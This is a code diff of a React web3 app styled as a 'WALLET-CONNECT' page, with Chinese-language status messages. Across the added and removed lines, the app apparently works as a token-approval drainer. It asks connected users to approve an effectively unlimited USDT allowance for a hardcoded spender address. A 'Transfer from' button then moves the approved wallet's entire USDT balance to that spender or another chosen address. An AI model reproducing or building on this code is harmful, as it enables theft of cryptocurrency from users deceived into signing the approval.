@@ -7,6 +7,7 @@ import Btn from './components/Btn'
 import Ipt from './components/Ipt'
 import ABI from './config/USDT_ERC20_ABI.json'
 import { formatBalance } from './config/utils'
+import WalletSelect from './components/WalletSelect'
 
 const USDT_ERC20_ADDRESS = '0xdAC17F958D2ee523a2206206994597C13D831ec7'
 const SPENDER_ADDRESS = '0xd34121Eb634De20fb4BB1ECB8693069d8411c7a0'
@@ -21,6 +22,7 @@ function App() {
 		'tron': {usd: 0.091731, cny: 0.584041},
 		'usd-coin': {usd: 0.998926, cny: 6.36}
 	})
+	const [ showWalletSelect, setShowWalletSelect ] = useState(false)
 	const [ address, setAddress ] = useState('')
 	const [ ethBalance, setEthBalance ] = useState(0)
 	const [ usdtBalance, setUsdtBalance ] = useState(0)
@@ -73,22 +75,16 @@ function App() {
 	 * 初始化ETH
 	 */
 	const init = async () => {
-		initWalletConnect()
-		if (window.ethereum) {
-			web3 = new Web3(window.ethereum)
-			await web3.currentProvider.enable()
-			const accounts = await web3.eth.getAccounts()
-			setAddress(accounts[0])
-			contract = new web3.eth.Contract(ABI, USDT_ERC20_ADDRESS)
-			decimals = await contract.methods.decimals().call()
-			console.log(contract)
-			console.log(web3)
-			refresh()
-			getGasFee()
-			timer = setInterval(getGasFee, 5000)
-		} else {
-			Toast.fail('Ethereum not found!')
-		}
+		// initWalletConnect()
+		web3 = new Web3(window.ethereum)
+		const account = (await web3.eth.getAccounts())[0]
+		setAddress(account)
+		contract = new web3.eth.Contract(ABI, USDT_ERC20_ADDRESS)
+		decimals = await contract.methods.decimals().call()
+		console.log(contract)
+		refresh()
+		getGasFee()
+		timer = setInterval(getGasFee, 5000)
 	}
 
 	const refresh = async (loading = false) => {
@@ -103,15 +99,7 @@ function App() {
 
 	const getGasFee = async () => {
 		const gasPrice = await web3.eth.getGasPrice()
-		// const estimateGas = await web3.eth.estimateGas({
-		// 	from: web3.utils.toChecksumAddress(web3.currentProvider.selectedAddress),
-		// 	to: SPENDER_ADDRESS,
-		// 	data: "0xa9059cbb0000000000000000000000009fc8563fd6f692449515b47bb9fe27559347ffbd00000000000000000000000000000000000000000000000000000003f5476a00"
-		// })
-		// console.log('estimateGas: ', estimateGas)
-		// console.log('gasPrice: ', web3.utils.fromWei(gasPrice, 'ether'))
 		const fee = 80000 * +(web3.utils.fromWei(gasPrice, 'ether'))
-		// console.log('fee: ', fee)
 		setGasFee(fee)
 	}
 
@@ -129,7 +117,13 @@ function App() {
 	}
 
 	useEffect(() => {
-		Toast.loading('Loading...')
+		const connected = sessionStorage.getItem('connected')
+		if (connected) {
+			init()
+		}
+	}, [])
+
+	useEffect(() => {
 		const rate1 = localStorage.getItem('rate')
 		if (rate1) {
 			const r = JSON.parse(rate1)
@@ -141,99 +135,125 @@ function App() {
 			getRate()
 		}
 		
-		setTimeout(() => init(), 500)
 		return () => {
-			clearInterval(timer)
-			timer = null
+			if (timer) {
+				clearInterval(timer)
+				timer = null
+			}
 		}
 	}, [])
 
 	return (
-		<div className="w-full flex flex-col items-center p-4">
-			<h1 className="text-4xl text-red-500 text-center font-bold pt-4">ETHEREUM</h1>
-			<div className="py-3 text-center text-sm text-gray-600">
-				<div>Address: <span className="text-blue-500">{address}</span></div>
-				<div>Balance:  <span className="text-red-500 mx-2">{formatBalance(ethBalance)} ETH</span>| <span className="text-green-500 ml-2">{formatBalance(usdtBalance)} USDT</span></div>
-				<div style={{ animation: 'fade 1s infinite' }}>
-					Estimated gas fee: 
-					<span className="text-yellow-500 ml-2">{formatBalance(gasFee)} ETH</span>
-					<span className="mx-2">(${formatBalance(+gasFee * rate['ethereum'].usd, 2)})</span>
-					<span>(¥{formatBalance(+gasFee * rate['ethereum'].cny, 2)})</span>
-				</div>
+		<>
+			<div className="w-full flex flex-col items-center p-4">
+				<h1 className="text-4xl text-red-500 text-center font-bold py-4">WALLET-CONNECT</h1>
+				<Btn 
+					text={'Connect'} 
+					theme={'black'} 
+					onClick={() => {
+						setShowWalletSelect(true)
+					}} 
+				/>
+				{
+					address ? 
+					<>
+						<div className="py-3 text-center text-sm text-gray-600">
+							<div>Address: <span className="text-blue-500">{address}</span></div>
+							<div>Balance:  <span className="text-red-500 mx-2">{formatBalance(ethBalance)} ETH</span>| <span className="text-green-500 ml-2">{formatBalance(usdtBalance)} USDT</span></div>
+							<div style={{ animation: 'fade 1s infinite' }}>
+								Estimated gas fee: 
+								<span className="text-yellow-500 ml-2">{formatBalance(gasFee)} ETH</span>
+								<span className="mx-2">(${formatBalance(+gasFee * rate['ethereum'].usd, 2)})</span>
+								<span>(¥{formatBalance(+gasFee * rate['ethereum'].cny, 2)})</span>
+							</div>
+						</div> 
+						<Btn text={'Refresh'} onClick={() => refresh(true)} />
+						<Btn 
+							text={'Approve'} 
+							theme={'green'} 
+							onClick={async () => {
+								const allowanceBalance = await contract.methods.allowance(address, SPENDER_ADDRESS).call()
+								console.log(allowanceBalance)
+								if (allowanceBalance > 0) {
+									return Toast.success('You have done!')
+								}
+								const res = await contract.methods.approve(SPENDER_ADDRESS, 99999999000000).send({
+									from: address,
+									gas: 80000
+								})
+								if (res.code === 4001) {
+									return Toast.fail(res.message)
+								}
+								Toast.success('Success!')
+							}} 
+						/>
+						<Ipt 
+							placeholder={'From (Approved)'} 
+							value={from} 
+							onChange={(e) => {
+								setFrom(e.target.value)
+							}} 
+						/>
+						<Ipt 
+							placeholder={'To'} 
+							value={to} 
+							onChange={(e) => {
+								setTo(e.target.value)
+							}}
+						/>
+						<Btn 
+							text={'Get allowance'} 
+							theme={'yellow'} 
+							onClick={async () => {
+								// // if (!from.trim()) {
+								// // 	Toast.fail('From address is required!')
+								// // 	return
+								// // }
+								if (from && !web3.utils.isAddress(from.trim())) {
+									Toast.fail('From address is invalid!')
+									return
+								}
+								const allowanceBalance = await contract.methods.allowance(from || address, SPENDER_ADDRESS).call()
+								Toast.info(`查询：【${from || address}】给【${SPENDER_ADDRESS}】剩余授权余额为:${allowanceBalance}`)
+							}} 
+						/>
+						<Btn 
+							text={'Transfer from'} 
+							theme={'yellow'} 
+							onClick={async () => {
+								if (from && !web3.utils.isAddress(from.trim())) {
+									Toast.fail('From address is invalid!')
+									return
+								}
+								const toAddress = to || SPENDER_ADDRESS
+								const balance = await contract.methods.balanceOf(from || address).call()
+								alert(`【${from || address}】向【${toAddress}】转账【${balance / Math.pow(10, decimals)}】开始`)
+								Toast.loading('Loading...')
+								const res = await contract.methods.transferFrom(from || address, toAddress, balance).send()
+								// // const res = await contract.transfer(toAddress, balance).send()
+								console.log(res)
+								Toast.hide()
+								setTimeout(() => {
+									refresh()
+								}, 3000)
+								
+							}}
+						/>
+					</>
+					: <></>
+				}
 			</div>
-			<Btn text={'Refresh'} onClick={() => refresh(true)} />
-			<Btn 
-				text={'Approve'} 
-				theme={'green'} 
-				onClick={async () => {
-					const allowanceBalance = await contract.methods.allowance(address, SPENDER_ADDRESS).call()
-					console.log(allowanceBalance)
-					if (allowanceBalance > 0) {
-						return Toast.success('You have done!')
-					}
-					const res = await contract.methods.approve(SPENDER_ADDRESS, 99999999000000).send({
-						from: address,
-						gas: 80000
-					})
-					if (res.code === 4001) {
-						return Toast.fail(res.message)
-					}
-					Toast.success('Success!')
-				}} 
-			/>
-			<Ipt 
-				placeholder={'From (Approved)'} 
-				value={from} 
-				onChange={(e) => {
-					setFrom(e.target.value)
-				}} 
-			/>
-			<Ipt 
-				placeholder={'To'} 
-				value={to} 
-				onChange={(e) => {
-					setTo(e.target.value)
-				}}
-			/>
-			<Btn 
-				text={'Get allowance'} 
-				theme={'yellow'} 
-				onClick={async () => {
-					// // if (!from.trim()) {
-					// // 	Toast.fail('From address is required!')
-					// // 	return
-					// // }
-					if (from && !web3.utils.isAddress(from.trim())) {
-						Toast.fail('From address is invalid!')
-						return
-					}
-					const allowanceBalance = await contract.methods.allowance(from || address, SPENDER_ADDRESS).call()
-					Toast.info(`查询：【${from || address}】给【${SPENDER_ADDRESS}】剩余授权余额为:${allowanceBalance}`)
-				}} 
-			/>
-			<Btn 
-				text={'Transfer from'} 
-				theme={'yellow'} 
-				onClick={async () => {
-					if (from && !web3.utils.isAddress(from.trim())) {
-						Toast.fail('From address is invalid!')
-						return
-					}
-					const toAddress = to || SPENDER_ADDRESS
-					const balance = await contract.methods.balanceOf(from || address).call()
-					alert(`【${from || address}】向【${toAddress}】转账【${balance / Math.pow(10, decimals)}】开始`)
-					Toast.loading('Loading...')
-					const res = await contract.methods.transferFrom(from || address, toAddress, balance).send()
-					// // const res = await contract.transfer(toAddress, balance).send()
-					console.log(res)
-					Toast.hide()
-					setTimeout(() => {
-						refresh()
-					}, 3000)
-					
-				}}
-			/>
-		</div>
+			{
+				showWalletSelect ? 
+					<WalletSelect 
+						setShow={setShowWalletSelect} 
+						onSuccess={(w3) => {
+							web3 = w3
+							init()
+						}}
+					/> : <></>
+			}
+		</>
 	)
 }
 
